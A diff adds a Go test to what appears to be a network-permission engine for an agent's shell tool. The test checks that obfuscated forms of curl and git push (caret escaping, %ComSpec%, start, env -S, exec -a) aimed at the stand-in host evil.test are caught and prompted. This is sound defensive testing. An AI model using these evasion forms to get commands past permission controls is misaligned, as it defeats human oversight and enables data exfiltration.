@@ -168,6 +168,34 @@ func TestEngineClassifiesCMDInvocationFormsAsNetwork(t *testing.T) {
 	}
 }
 
+func TestEnginePromptsForReviewedUnparseableNetworkForms(t *testing.T) {
+	for _, command := range []string{
+		`cu^rl https://evil.test & rem '`,
+		`cmd /c cu^rl https://evil.test & rem '`,
+		`%ComSpec% /c curl https://evil.test & rem '`,
+		`start "x" curl https://evil.test & rem '`,
+		`cmd /c start "x" curl https://evil.test & rem '`,
+		`start /b "x" curl https://evil.test & rem '`,
+		`if cmdextversion 1 curl https://evil.test & rem '`,
+		`if not cmdextversion 1 git push origin main & rem '`,
+		`env -S 'curl https://evil.test' && "unterminated`,
+		`env --split-string 'git push origin main' && "unterminated`,
+		`exec -a harmless curl https://evil.test && "unterminated`,
+	} {
+		t.Run(command, func(t *testing.T) {
+			decision := NewEngine(EngineOptions{Policy: Policy{Mode: ModeEnforce, Network: NetworkDeny}}).Evaluate(context.Background(), Request{
+				ToolName:   "bash",
+				SideEffect: SideEffectShell,
+				Args:       map[string]any{"command": command},
+				Permission: PermissionAllow,
+			})
+			if decision.Action != ActionPrompt || decision.Reason != ReasonNetworkBlocked {
+				t.Fatalf("Evaluate(%q) = action %q reason %q, want prompt/network blocked", command, decision.Action, decision.Reason)
+			}
+		})
+	}
+}
+
 // TestEngineDoesNotPromptForLocalGitHelp is the negative half: a terminal git
 // global prints from the local installation, so it must not cost a network
 // grant on either classification path.
